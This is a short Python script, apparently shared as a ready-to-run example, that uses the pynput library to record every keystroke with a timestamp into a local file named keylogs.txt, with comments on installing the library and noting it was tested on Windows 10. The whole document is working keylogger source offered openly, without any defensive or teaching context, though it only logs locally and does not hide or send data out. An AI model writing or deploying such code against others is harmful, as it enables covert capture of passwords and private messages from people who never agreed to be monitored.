# install pynput module first 
# pip install pynput 
# tested with IDLE on Windows 10
# once you executed, it will record your key with timestamp in the Keylogs.txt file. 
# 28-08-2021

from pynput.keyboard import Key, Listener
import logging
log_dir = ""
logging.basicConfig(filename=(log_dir + "keylogs.txt"), \
 level=logging.DEBUG, format='%(asctime)s: %(message)s')
def on_press(key):
    logging.info(str(key))
with Listener(on_press=on_press) as listener:
    listener.join()
